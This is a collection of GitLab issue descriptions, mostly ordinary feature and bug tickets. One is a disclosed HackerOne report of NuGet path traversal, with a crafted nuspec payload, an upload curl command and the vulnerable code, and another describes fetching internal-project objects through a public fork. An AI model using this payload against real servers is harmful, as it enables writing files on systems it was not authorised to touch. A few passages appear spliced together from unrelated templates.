title: Add creator_id to namespace data tables
description:
### Problem
Currently, when we're reviewing how users adopt GitLab we can look at user data and namespace data. However, if we want to look at specific adoption journies where we look at users that signup for GitLab and then go on to create namespaces and how successful those namespaces become we run into issues joining the tables. 

If we join `users` to the `memberships` table we can see what namespaces a user is a member of and if they're an owner of that namespace. This is helpful but still poses challenges as we see a lot of user signup and join existing namespaces which then inflates namespace adoption metrics since the user is new but the namespace was existing. 
 
### Proposed Solution
We add a `Creator_ID` to our namespace data so we know the ID of the user that created the namespace. This will allow us to understand what users that signup for GitLab go on to create namespaces that become successful.

title: Add healthcheck to CE
description:
### Overview:
The purpose of this issue is to add the health check that's currently live in EE to CE, original issue for EE can be found here https://gitlab.com/gitlab-org/gitlab/-/issues/231512. 
 
### Supporting data:
I've pulled the number of CE instances that we have with usage ping on by version number and number of users ([source](https://app.periscopedata.com/app/gitlab/551863/Growth-Conversion-Team:-SamA-Scratch-Dashboard?widget=9677728&udv=949690)). If we match the experience in EE and set the health check experience to launch once an instance with usage ping on has at least 50 users then within 3 releases we can anticipate the following: 
 
|Instances L3 versions w/ usage ping & 50+ users | Click rate | Leads generated |
| ------ | ------ | ------ |
| 22,887 | 0.25% | 57 |
| 22,887 | 0.75% | 172 |
 
In our initial test of a "talk to sales" (PQL) option in the SaaS app we're seeing an average view to click rate of ~ 0.25% - [source](https://gitlab.com/gitlab-org/gitlab/-/issues/238207).
 
### Proposed solution
This issue will be resolved when we add the health check experience to all instances of CE with usage ping turned on and a user count of 50 or more users.

title: Auto-Remediation - Link to auto-created MRs in pipeline widget - Frontend
description:
* Main issue: https://gitlab.com/gitlab-org/gitlab/-/issues/216027
* Parent issue: https://gitlab.com/gitlab-org/gitlab/-/issues/234082

This issue is for adding information about auto-created MRs in the [upcoming pipeline widget](https://gitlab.com/gitlab-org/gitlab/-/issues/241060) in the **Project Vulnerability List**.

We want to show how many auto-fix MRs are currently open, and link to the filtered list of those.

![anchor_to_MR_list_filtered](/uploads/e709c565be66b84ebd428a704120723e/anchor_to_MR_list_filtered.png)

## Implementation plan

* [x] The ~backend should expose a link to the project's **Merge Requests** page, ideally with the search params already set to only show auto-fix MRs.
* [x] Trigger a GraphQL query to retrieve the list of open auto-fix MRs (labelled with `GitLab-auto-fix`).
  * Depending on how https://gitlab.com/gitlab-org/gitlab/-/issues/241060 is resolved, _where_ we trigger the query might change. More details to come.
* [x] Use the data mentioned above to display the MRs count and a link in the pipeline widget.

## GraphQL query

The GraphQL API already provides a way to retrieve MRs by labels and status:

```graphql
query autoFixMRs($fullPath: ID!) {
  project(fullPath: $fullPath) {
    mergeRequests(labels: "GitLab-auto-fix", state: opened) {
      count
    }
  }
}
```

/cc @kmann

title: Auto-Remediation - User callout - Frontend
description:
* Main issue: https://gitlab.com/gitlab-org/gitlab/-/issues/216027
* Parent issue: https://gitlab.com/gitlab-org/gitlab/-/issues/234082/

This issue is for adding a banner above the **Project Vulnerability List** to let users know about the **auto-fix** feature.

![banner](/uploads/1cf553c5e9511a16d002703feae0cad7/banner.png)

## Implementation plan

* [x] Create the callout component.
  * [x] It's based on `GlBanner`.
  * [x] Dismissing it sets a cookie to store the user's preference not to see the callout again.
  * [x] It provides a link to the documentation.
  * [x] The text reads `If you're using dependency and/or container scanning, and auto-fix is enabled, auto-fix automatically creates merge requests with fixes to vulnerabilities.`
* [x] Display the component above the **Project Vulnerability List**.

title: Reduce failed DB migrations that are caught in production
description:
Closing this issue in favor of tracking in this epic Automated database testing using thin clones  - https://gitlab.com/groups/gitlab-org/database-team/-/epics/9

## Problem 

Since August, there have been multiple incidents of failed DB migration after deployment in production

- https://gitlab.com/gitlab-com/gl-infra/production/-/issues/2589 (production)
- ~~https://gitlab.com/gitlab-com/gl-infra/production/-/issues/2539 (production)~~ (Correction: This is actually in staging. -Chun)
- https://gitlab.com/gitlab-com/gl-infra/production/-/issues/2672 (production)
- https://gitlab.com/gitlab-com/gl-infra/production/-/issues/2731 (production)

https://gitlab.com/gitlab-com/gl-infra/production/-/issues/2731

How can we align migration testing to an environment that mirrors the volume of data that GitLab.com has? 

Created from this [Slack thread](https://gitlab.slack.com/archives/CMA7DQJRX/p1599757978053000) started by @cdu1 

>>>
I’m not sure if MR review will help catch migration failures at all. On the other hand, I wonder if there is a way to test a deployment end-to-end (deployment + post deployment tasks such as DB migration) in a close-to-real testing environment, ideally with a slice of GitLab.com production DB at a reasonable scale. Will this (if possible) help catch DB migration failures before they pollute production environment? /cc @meks @craig-gomes 
>>>

title: Download Composer dependencies from version control
description:
### Problem to solve

When downloading Composer dependencies, you have two options. You can use `source` or `dist`. For stable versions, Composer will use the `dist` by default. The `source` is a version control repository, like your GitLab Project. If `--prefer-source` is enabled, Composer will install from source as a git clone instead of downloading a packaged zip file. This is useful if you want to make a bugfix to a project and get a local git clone of the dependency directly.

The problem is that until recently, you could not use the `prefer-source` and `preferred-install` commands and configurations when downloading Composer dependencies. This prevented many of you from using the GitLab Package Registry for your Composer dependencies. 

### Proposal

Add support for `prefer-source` and `preferred-install` so that PHP Developers can configure Composer to download packages from git instead of as a zip file. 

### Steps to reproduce

1. Create a project in a group.
2. Enable the Packages feature if not already enabled.
3. Make sure the project has a valid `composer.json`:

```
{
  "name": "m4rw3r/composer-test-project",
  "description": "Composer test project for prefer-source install",
  "license": "MIT"
}
```

4. Publish the package using curl: `curl --data branch=master 'https://__token__:<token>@gitlab.com/api/v4/projects/21057249/packages/composer`.
5. Create a new folder and add the following to a `composer.json`:

```json
{
  "repositories": [
    {"type":"composer","url":"https://gitlab.com/api/v4/group/9281167/-/packages/composer/packages.json"}
  ],
  "require": {
    "m4rw3r/composer-test-project": "dev-master"
  }
}
```

6. Attempt to install the package using `composer install -vvv --prefer-source`.

The package will install successfully, but not from source. In the log produced
it will list that it is downloading the package as a zip-file instead of
checking out a clone, despite `--prefer-source` being specified.

### Example Project

https://gitlab.com/test-group321/composer-test-project

title: Public snippet cannot be accessed via API without authentication
description:
<!---
Please read this!

Before opening a new issue, make sure to search for keywords in the issues
filtered by the "regression" or "bug" label:

- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression
- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug

and verify the issue you're about to submit isn't a duplicate.
--->

### Summary

<!-- Summarize the bug encountered concisely. -->

A public snippet can be open in the browser directly without authentication. But when accessing with API, a `401 Unauthorized` error is returned.

### Steps to reproduce

<!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. -->

1. Create a public snippet from <https://gitlab.com/-/snippets/new>.
1. Open an incognito window and visit `https://gitlab.com/api/v4/snippets/<SNIPPET_ID>`.

Quick reproduction: just visit <https://gitlab.com/api/v4/snippets/2013793> from a newly created incognito window (to make sure that you are not logged in).

### Example Project

<!-- If possible, please create an example project here on GitLab.com that exhibits the problematic 
behavior, and link to it here in the bug report. If you are using an older version of GitLab, this 
will also determine whether the bug is fixed in a more recent version. -->

My public snippet: <https://gitlab.com/-/snippets/2013793>

### What is the current *bug* behavior?

<!-- Describe what actually happens. -->

The API returns `401 Unauthorized`.

### What is the expected *correct* behavior?

<!-- Describe what you should see instead. -->

It should return the content of the snippet since it's public, as in GitHub.

### Output of checks

<!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com -->

This bug happens on GitLab.com

title: Deduplicated objects from an internal repository are publicly accessible by name through a public project
description:
In https://gitlab.com/gitlab-org/gitlab/-/issues/33318 we made it possible to deduplicate internal projects. A consequence of this is that in the following scenario it is possible:

1. Fork public project `Project A` -> `Project B`, currently Both projects are public, the object pool is created
1. Change the visibility level on `Project A` to internal, the fork network is broken, but `Project B` remains part of the maintained object pool
1. Create a commit in `Project A`, and take note of the hash.
1. Trigger housekeeping on `Project A`, this will cause objects to be fetched into the object pool
1. In a clone of `Project B` as an Anonymous user, perform `git fetch origin <commit sha>`, this succeeds because it is available in the object pool

The refs aren't advertised, so users need to know the sha of objects to be able to fetch them through the public project.

**Qeustion:**

If we are okay with internal objects being publicly accessible in this way, could we allow deduplication for private projects?

title: Roadmaps: Speed up render time
description: Even though we're utilising VirtualList to render epic items in roadmap it still gets slow on large number of epics and the biggest culprit is the epic items' `timeframe`. When we seek timeframes by scrolling horizontally, we add non-trivial complexity to our render cycle. If we have `N` epic items and load up timeframes for upto 3 years, `12 * 3` timeframes are loaded if block size is months. Now, we'd on each scroll have to render `36 * N` items. As this number increases, the more choppy the page becomes. Proposed solution Use two VirtualLists in tandem. One for vertical and another for horizontal. Marginal gains 1. Memoize functions like `timelineBarStyles(epic)`, `timeframeString(epic)`, etc. 2. For tooltips, prefer `this.getTarget` over `:target="() => $refs.childEpicsCount"` (also, `() => $refs.expandCollapseInfo`). cc: @donaldcook

### Problem to solve

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

### User experience goal

<!-- What is the single user experience workflow this problem addresses? 
For example, "The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to <perform a specific task>"
https://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --> 

Today we show https://gitlab.com/gitlab-org/gitlab/-/value_stream_analytics

We already present deployment frequency as a numerical value but we need to show this in a chart view - as the trend is the most interesting aspect of this metric. 




### Proposal

<!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey -->

Under Analytics->CI/CD: 

* Add to overall statistics the deployment frequency (same value as the one presented in the value stream analytics) 

* Present a chart for deployment frequency for daily periods for the past week


* Present a chart for deployment frequency for daily periods for the past month


* Present a chart for deployment frequency for daily periods for the past year

Not in scope of this issue:

* Annotations on the chart
* Ability to select custom dates to get this data (at the moment we present last week, last month, last year)
* ability to view group level analytics
* ability to view instance level analytics


### Further details

<!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. -->

Deployment frequency otherwise known as throughput, is a measure of how frequently your team deploys code. This metric is often represented as a percentage and it answers the question “how often do we deploy to production or to another significant point in our CD pipeline such as a staging environment?”.


What this looks like in Atlassian 

![image](/uploads/b087d94aa41c8a99876e6961e42d0049/image.png)

title: [Feature flag] Enable Pipeline Triggers settings port to Vue
description:
<!-- Title suggestion: [Feature flag] Enable description of feature -->

## What

In https://gitlab.com/gitlab-org/gitlab/-/issues/250312 we delivered a change to rewrite the Pipeline Triggers table in Vue (MR https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41864)

The goal of this rollout issue is to ensure the Vue port works as the previous version and then remove the previous version.

Remove the `:ci_pipeline_triggers_settings_vue_ui` feature flag.

### Cleanup notes:

## Owners

- Team: ~"group::continuous integration" 
- Most appropriate slack channel to reach out to: `#g_ci`
- Best individual to reach out to: @mrincon 

## Expectations

### What are we expecting to happen?

### What might happen if this goes wrong?

### What can we monitor to detect problems with this?

<!-- Which dashboards from https://dashboards.gitlab.net are most relevant? -->

## Beta groups/projects

If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example.

- `gitlab-org/gitlab` project
- `gitlab-org`/`gitlab-com` groups
- ...

## Roll Out Steps

- [x] Enable on staging
- [x] Test on staging
- [ ] Ensure that documentation has been updated
- [ ] Enable on GitLab.com for individual groups/projects listed above and verify behaviour
- [ ] Coordinate a time to enable the flag with `#production` and `#g_delivery` on slack.
- [ ] Clean up old code (non-exhaustive list)
  - [ ] `app/presenters/ci/trigger_presenter.rb` (full removal)
  - [ ] `spec/features/triggers_spec.rb` (remove old tests)
  - [ ] Remove `@triggers` from `app/controllers/projects/settings/ci_cd_controller.rb`
- [x] Announce on the issue an estimated time this will be enabled on GitLab.com
- [x] Enable on GitLab.com by running chatops command in `#production`
- [ ] Cross post chatops slack command to `#support_gitlab-com` ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#where-to-run-commands)) and in your team channel
- [ ] Announce on the issue that the flag has been enabled
- [ ] Remove feature flag and add changelog entry
- [ ] After the flag removal is deployed, [clean up the feature flag](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) by running chatops command in `#production` channel

title: Consider using Ability instead of disabling cop
description:
### Problem to solve

Sometimes in the code `rubocop:disable` is invoked so authorization can be checked by calling `current_user.admin?`.  In https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40871#note_409846113 @dzaporozhets suggested out we could instead use something like `Ability.allowed?(current_user, :admin_instance)`.

### Proposal

Use `Ability.allowed?` instead of `rubocop:disable Graphql/AuthorizeTypes`.

title: Environments dropdown in mobile is not stretching to its full width
description:
While [fixing](gitlab-org/gitlab!41688) [this](gitlab-org/gitlab#235004), we noticed the environments dropdown is not stretching to its full width. This is because of `min-width: initial;` applied from `/app/assets/stylesheets/framework/responsive_tables.scss:126`.

Additional, related to [this comment](https://gitlab.com/gitlab-org/gitlab/-/issues/235004#note_422082793), the main table should also receive the same `gl-` class.

|Responsive dropdown bug|
|-|
|![responsive-001](/uploads/a9e9fd96d4749a9955df83731d1eb6ba/responsive-001.mov)|

One solution could be to apply a `min-width: max-content;` for mobile. The [other](https://gitlab.com/gitlab-org/gitlab/-/issues/233603), to use the [GitLab UI Dropdown Component](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-dropdown--default).

*Note*: If going with the first solution, a class so it needs to be added [GitLab Ui Utilities](https://gitlab.com/gitlab-org/gitlab-ui/#gitlab-ui-css) before proceeding with this one.

title: Add naming pattern for Redis HLL metrics to Telemetry guide
description:
Adding more context to prefix used.

* `g_` prefix is from group, as an event which is tracked for group

* `p_` is from project as an event which is tracked for project

* `i_` from instance as an event which is tracked for instance

* `o_` for other

* `a_` all (of `g_` `p_` `i_`)

This is a pattern which was initially introduced by manage analytics group, I think make sense to use it further

title: Mention telemetry group in Danger bot when MR is ready for for review
description:

We could make a change so that:

* When ~telemetry changes are detected  we add the labels: ~telemetry ~"telemetry::review pending" and add the warning message as we currently do but without mentioning `@gitlab-org/growth/telemetry/engineers` group

Con:

cc @gitlab-org/growth/telemetry/engineers

title: Investigate/apply usage of INTERSECT operator in EpicsFinder
description:
In EpicsFinder, the query to fetch "all epics in a group and its subgroups (or ancestor groups) which user can see" is quite expensive, part of the reason is that we have to get all groups and its descendants/ancestors which user is member of. 

@alexpooley made some optimizations in finding "all groups in hierarchy user can access" - https://gitlab.com/gitlab-org/gitlab/-/issues/217937#note_408782904, so it would be nice to try to use this approach also in EpicsFinder.

title: DAST site validation - Set correct validation-toggle state when editing a profile
description:
## Problem to solve

When a user has **previously enabled site validation** and then comes back to **edit** the profile, we want to set the validation-toggle, loading states and messages on the edit form accordingly.
 
Currently it would be toggled off, unless the site has been validated successfully. 

## Possible solution

Leverage the profile's state, which we retrieve from the `dastSiteValidation` query, to set the toggle.

This are the possible states:

```javascript
const states = {
  PENDING_VALIDATION: "PENDING_VALIDATION",
  INPROGRESS_VALIDATION: "INPROGRESS_VALIDATION",
  PASSED_VALIDATION: "PASSED_VALIDATION",
  FAILED_VALIDATION: "FAILED_VALIDATION",
};
```

When the validation is **in-progress** (`state === "INPROGRESS_VALIDATION"`) the toggle should be set to `disabled` and a message that indicates that a validation is in-progress should be show:

![Screen_Shot_2020-09-24_at_9.55.02_AM](/uploads/236d97ca04a703febcabbe6e26c87512/Screen_Shot_2020-09-24_at_9.55.02_AM.png)

When the validation has **failed** (`state === "FAILDED_VALIDATION"`) the toggle should be set to off, a message should be shown and a `retry` button displayed, that when clicked resets the error message and toggles the `validate site` status on:

![Screen_Shot_2020-09-24_at_9.39.28_AM](/uploads/a7fea2ee148b3e485c9ad6b1837540ac/Screen_Shot_2020-09-24_at_9.39.28_AM.png)

title: Geo: Replicate deletion of remote stored files
description:
When this setting is enabled, Geo syncs to secondaries' object storage.

![image](/uploads/d59ba0c412e6d8712498b2db3d6a9779/image.png)

But we never remove anything from object storage, so wasted storage will grow when replicated by Geo. (Note that this feature is in Beta: https://docs.gitlab.com/ee/administration/geo/replication/object_storage.html#enabling-gitlab-managed-object-storage-replication)

Deletions are done by `FileRegistryRemovalWorker` as part of:

- Processing delete events
- A background process constantly reconciling any primary/secondary differences (`RegistryConsistencyWorker`)

## Proposal

- [ ] `FileRegistryRemovalWorker` should be able to delete remote-stored files
- [ ] `FileRegistryRemovalWorker` should be used properly to also delete remote-stored files (e.g. passing it what the local file path would be if the file were stored locally will not work)

epic.title: Geo: GA support for object storage replication

title: Path traversal in nuget metadata extraction allowing packages to be saved anywhere
description:
**[HackerOne report #835427](https://hackerone.com/reports/835427)** by `vakzz` on 2020-03-31, assigned to @ankelly:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#####  Summary  
After a nuget package is uploaded via the api, the `UpdatePackageFromMetadataService` is run to update the package and file names based on the metadata in the `nuspec` file which is extracted from the package zip. Neither the extracted id or version is checked for path traversal, allowing the `package.nupkg` to be moved anywhere that the `git` user has access.


#####  Steps to reproduce  
1. create a project  
1. create a `spec.nuspec` file with the following contents

    ```xml  
<?xml version="1.0"?>  
<package xmlns="http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd">  
    <metadata>  
        <id>../../../../../../../../../../../../../</id>  
        <version>./var/opt/gitlab/.ssh/aaa</version>  
    </metadata>  
</package>    
    ```  
1. zip it up and upload it via the api

    ```bash  
zip package.zip spec.nuspec  
curl -XPUT -v  'http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/112/packages/nuget/' -F package=[@]package.zip  
    ```  
1. after the metadata service has run you can see that the file has been moved `ls -asl /var/opt/gitlab/.ssh/`

![Screen_Shot_2020-04-01_at_2.07.29_am.png](https://h1.sec.gitlab.net/a/0493b2fb-063c-4914-acbf-d2fa8ab4f1ab/Screen_Shot_2020-04-01_at_2.07.29_am.png)


#####  Impact  
I'm still unsure of the complete impact of this, but there are a few thing to note:  
* the file will always have the `.nupkg` extension (can't see a way around this)  
* any parent directories are also created  
* the package has to be a valid zip file, but using something like https://truepolyglot.hackade.org/ arbitrary data can be appended to the start.

Knowing the above it might be possible to escalate this further, but requires more investigation.

#####  Examples  
nuget package used above: ![package.zip](https://h1.sec.gitlab.net/a/aa63dcfa-318c-47f4-bf86-aec163ebff0a/package.zip)  
package that is a polyglot with a shell script: ![hello.zip](https://h1.sec.gitlab.net/a/1be426fb-9a23-4781-89b5-0306d0986048/hello.zip)

#####  What is the current *bug* behavior?  
The package `file_name` is updated with values directly from the metadata without any checks:

```ruby  
      package_file.update!(  
            file_name: package_filename,  
            file: package_file.file  
          )

     def package_name  
        metadata[:package_name]  
      end

      def package_version  
        metadata[:package_version]  
      end

      def metadata  
        strong_memoize(:metadata) do  
          ::Packages::Nuget::MetadataExtractionService.new(package_file.id).execute  
        end  
      end

      def package_filename  
        "#{package_name.downcase}.#{package_version.downcase}.nupkg"  
      end  
```

#####  What is the expected *correct* behavior?  
The `package_filename` should be validated

#####  Output of checks  
######  Results of GitLab environment info

```  
System information  
System:		Ubuntu 18.04  
Proxy:		no  
Current User:	git  
Using RVM:	no  
Ruby Version:	2.6.5p114  
Gem Version:	2.7.10  
Bundler Version:1.17.3  
Rake Version:	12.3.3  
Redis Version:	5.0.7  
Git Version:	2.24.1  
Sidekiq Version:5.2.7  
Go Version:	unknown

GitLab information  
Version:	12.9.1-ee  
Revision:	0ebcf602332  
Directory:	/opt/gitlab/embedded/service/gitlab-rails  
DB Adapter:	PostgreSQL  
DB Version:	10.12  
URL:		http://gitlab-vm.local  
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git  
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git  
Elasticsearch:	no  
Geo:		no  
Using LDAP:	no  
Using Omniauth:	yes  
Omniauth Providers:

GitLab Shell  
Version:	12.0.0  
Repository storage paths:  
- default: 	/var/opt/gitlab/git-data/repositories  
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell  
Git:		/opt/gitlab/embedded/bin/git  
```

####  Impact

An attacker can write controlled data with the extension `.nupkg` to anywhere the `git` user has access

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen_Shot_2020-04-01_at_2.07.29_am.png](https://h1.sec.gitlab.net/a/0493b2fb-063c-4914-acbf-d2fa8ab4f1ab/Screen_Shot_2020-04-01_at_2.07.29_am.png)
* [package.zip](https://h1.sec.gitlab.net/a/aa63dcfa-318c-47f4-bf86-aec163ebff0a/package.zip)
* [hello.zip](https://h1.sec.gitlab.net/a/1be426fb-9a23-4781-89b5-0306d0986048/hello.zip)

## How To Reproduce

title: Cancel GitHub project imports - frontend
description:
### Release notes Up until now, when you were importing GitHub projects into GitLab, you could not cancel an import in progress. Now you are able to cancel imports from GitHub that are pending or in progress. If the import has already started, the imported files are kept. ## Problem to solve Currently, when a user imports projects into GitLab there is no way for them to cancel an import in-progress. ### Proposal Allow users to cancel a repository that is importing. * User can start the cancel process when an import is: * Pending * In progress * User can't cancel after an import is complete. * An import that is cancelled can not be resumed\* * Any files that have been imported stay in the project * [In the future](https://gitlab.com/gitlab-org/gitlab/-/issues/364707) we plan to offer the ability to delete after cancelling. *\*However, it might be desirable in the future.* ### Solution | Flow | Mock | | ------ | ------ | | ![image](/uploads/3b8daaa780ed364fef29be1043002e1b/image.png) | ![image](/uploads/b72330861e33d7fd51ed28ed8d328b1d/image.png) | - Show a **Cancel** button on the importer page for imports that are pending or in progress. - Cancel button should have a popover that gives more information and a link to the (yet to be created) docs. - **Cancel import**
Imported files will be kept. You can import this repository again later. [Learn more](#). As part of this MVC there will be no change to the functionality in import history and project view ([details](https://gitlab.com/gitlab-org/gitlab/-/issues/247325#note_991372298)). Details and exploratory work is available in [Figma](https://www.figma.com/file/lK3873uXEMUGmaC7nHkx5G/GitHub-Importer?node-id=1806%3A5075) :eyes: ### Context The scope of this issue is for GitHub importer only. Cancel flows are tracked in this epic → https://gitlab.com/groups/gitlab-org/-/epics/8218+ It requires https://gitlab.com/gitlab-org/gitlab/-/issues/364783 to be completed.
Original work and scope of issue # Problem to solve Currently, when a user imports projects into GitLab there is no way for them to cancel an import in-progress. The below scenario illustrates the problem: #### Import all repositories 1. User authenticates their GitHub account. :slight_smile: 1. Selects "Import 234 repositories" from the `Import repositories from GitHub` page which initiates the import. :slight_smile: 1. User realizes they had made a mistake and needs to cancel their import and correct the error. :confused: 1. User finds no way to cancel the import. :rage: 1. User must go into GitLab project settings for each imported project and delete them manually. :weary: This process is quite cumbersome and could cause a lot of frustration for the users. # Proposal Allow the user to cancel imports once a project import has been initiated. **View the Figma file for the user flow:** :eye: [User flow for canceling project imports](https://www.figma.com/file/WRpBznfNzkGruiIAINxFRv/Canceling-Project-Imports?node-id=0%3A1) **View the Figma prototype for:** :eye: [Cancel all project imports](https://www.figma.com/proto/WRpBznfNzkGruiIAINxFRv/Canceling-Project-Imports?node-id=180%3A4678&scaling=min-zoom) :eye: [Cancel single project imports](https://www.figma.com/proto/WRpBznfNzkGruiIAINxFRv/Canceling-Project-Imports?node-id=143%3A36057&scaling=min-zoom)

title: DAST Profiles forms - Improve code reusability
description:
# Problem to solve

Both the **DAST Site profile** form and the **DAST Scanner profile** form share similar functionalities:

* Rename the `dast_site_profiles_form` dir to `dast_site_profiles`.
* They both trigger a GraphQL mutation for either creating or updating a profile.
* They have similar (not to say identical) computed properties for keeping track of the form's state.
* They accept similar props.
* They deal with errors similarly.
* They both handle submission in a similar way.
* ...

Let's figure out a way to normalize and share as much code as possible between those two components to reduce duplication and improve maintainability.

* Related discussion: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40963#note_405944792

title: Issues Analytics: Add total number of open issues total chart (backend)
description:
### Problem to solve

Currently Issues Analytics only shows open issues.  As explained in https://gitlab.com/gitlab-org/gitlab/-/issues/233905, it would be valuable if it also showed total cumulative opened issues.

### Proposal

> We would need to create a new endpoint, or extend the `analytics_issues`-endpoint (I cannot find an existing one) to return total_issues for a given month, this requires several `count` queries to the database with potentially no limit since we need to count "issues created before a certain date and issues either not closed at all or closed after a certain date" for each month. ([source](https://gitlab.com/gitlab-org/gitlab/-/issues/233905#note_400103610))

Total open issues = number of issues opened before the end of given month and (not closed at all OR closed after the end of given month).

### Technical details

We can do 1 query for all opened issues before selected timespan and then do the math for selected period with small queries:
```
total_jan = (created_at <= Jan AND closed_at IS NULL OR closed_at > Jan)
total_feb = total_jan + opened_feb - closed_feb
total_mar = total_feb + opened_mar - closed_mar
....
```

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

This is confusing if only hashed storage is disabled.

https://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ -->

title: Instrument usage of merge requests file-by-file mode
description:
### Problem

At the moment we don't have any data on the usage of our [file-by-file diff navigation feature in Merge requests](https://docs.gitlab.com/ee/user/project/merge_requests/reviewing_and_managing_merge_requests.html#file-by-file-diff-navigation).

Having this data is key to be able to understand the impact of our iterative improvements on this epic: https://gitlab.com/groups/gitlab-org/-/epics/516

### Proposal

Track the number of MRs viewed using the file-by-file/single-file mode.

epic.title: 📑 File-by-file merge request diff navigation MVC

title: Update "copy branch" keyboard shortcut to click the sidebar button
description:
### Summary

When pressing the "copy branch name" keyboard shortcut (<kbd>⌘</kbd><kbd>B</kbd>) on an MR page, the page's scroll jumps up near the top of the page.

### Steps to reproduce

1. Navigate to https://gitlab.com/gitlab-org/gitlab/-/merge_requests/36338
1. Once the page has fully loaded, scroll to the bottom of the page
1. Press <kbd>⌘</kbd><kbd>B</kbd> (or <kbd>Ctrl</kbd>+<kbd>B</kbd> on non-Macs)

### What is the current *bug* behavior?

The scroll jumps to the top of the page in order to bring the "Copy branch name" button into view.

### What is the expected *correct* behavior?

Pressing the <kbd>⌘</kbd><kbd>B</kbd> keyboard shortcut should not affect the page's scroll.

### Output of checks

This bug happens on GitLab.com.

### Possible fixes

Currently, this keyboard shortcut is implemented by triggering a "click" event on the "Copy branch name" button in the body of the MR page:

![image](/uploads/f0b5ddae3b3095b889c99fd9217ac727/image.png)

Instead, the "click" event could be triggered on the similar button in the MR sidebar:

![image](/uploads/ee2302b3f60a643e3c4a6252153b3c41/image.png)

This would allow the main content's scroll to be unaffected.

On really short screens, this still may cause some unwanted scrolling inside the sidebar, but this is much less annoying.

### Other info

This keyboard shortcut was originally developed in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/36338 (before the sidebar button existed).

title: DevOps Adoption MVC (backend)
description:
This is the data collection ~backend implementation issue for https://gitlab.com/gitlab-org/gitlab/-/issues/247112

### Proposal

We already have models for storing segments and the boolean flags (collected data), however the data collection part is missing.

1. Create a service class that collects the boolean flags (and stores it in the Snapshot model) for a time period (30) day for a given Segment.
  - Snapshot model definition with the boolean flags: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/47388/diffs
  - The service should use group level finders to collect info about the following data points: https://gitlab.com/gitlab-org/gitlab/-/issues/247112#note_425512083
  - Example calculation for merge requests opened: 
       ```ruby
       merge_request_opened = MergeRequestsFinder.new(group: Segment.groups).execute.last.created_at < 30.days.ago
       ```
2. Define a cron job (monthly) which runs the service and persists the data (in a snapshot)

title: Purchase confirmation banner does not appear when users make a new purchase for an existing group
description:
<!---
Please read this!

Before opening a new issue, make sure to search for keywords in the issues
filtered by the "regression" or "bug" label:

- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression
- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug

and verify the issue you're about to submit isn't a duplicate.
--->

### Summary

We recently rolled-out a new purchase experience that enables SaaS users to subscribe to a plan from the GitLab application without going through the customer portal. This experience was duplicated from the revamped [paid signup flow](https://gitlab.com/gitlab-org/growth/product/-/issues/87/), where at the end of the purchase, users see a confirmation banner. Using the same checkout flow but on the group billing page, user can not see the confirmation banner after they purchase. Unless users are navigating back to the billing page, they can not tell whether the purchase was successful or not. (This was tested on staging).   

### Steps to reproduce

<!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. -->
* Open GitLab.
* Navigate to one of your groups - **You must be an owner of this group, and this group should use a free plan.**
* Navigate to settings > billing.
* Click on the upgrade button in one of the 3 plan card (Bronze - Silver - Gold). 
* Complete all steps of the checkout flow.
* Click on confirm purchase.

### What is the current *bug* behavior?

After the purchase, users get redirected to their group homepage without the confirmation banner.

### What is the expected *correct* behavior?

After the purchase, users get redirected to their group homepage where a confirmation banner is displayed.

### Relevant logs and/or screenshots

#### Current behaviour: 
![image](/uploads/10a123026615dc3de22f7eb896553d66/image.png)

#### Intended behaviour (Solution):
![Frame_37](/uploads/6059e6c808e47d51dde6bd7c8e295c4e/Frame_37.jpg)

title: Add user action attribute to known_events
description:
The following discussion from !41301 should be addressed:

@alinamihaila I just realized this now, but maybe we can do this on a follow-up issue:

I think we need a way to prevent incrementing values for events that are not meant to be incremented by a user action? For example the event for https://gitlab.com/gitlab-org/gitlab/-/issues/238604 which is meant to track unique test cases parsed, should not be allowed to be incremented through this endpoint.

EDIT: Maybe an additional attribute under `known_events.yml` like `user_action: true|false` to determine such events?

cc @gitlab-org/growth/telemetry/engineers

title: DAST Site validation - Improve validation path handling
description:
# Problem to solve

When creating a **DAST Site profile**, users are asked to provide a **Target URL** which can then be validated by switching the **Validate target site** toggle on. In the validation section that shows up, one of the options available involves uploading a validation file to the target site, and providing the file's URL via a text input with the **Target URL** prepended.

![Screen_Shot_2020-09-09_at_7.59.35_AM](/uploads/a2b3886a026998e4dc498edfa2fdffb8/Screen_Shot_2020-09-09_at_7.59.35_AM.png)

The current iteration doesn't actually uses the validation file's location at all. Let's make sure users are able to provide a path to their validation file based on this [discussion](https://gitlab.com/gitlab-org/gitlab/-/issues/233020#note_409789282).

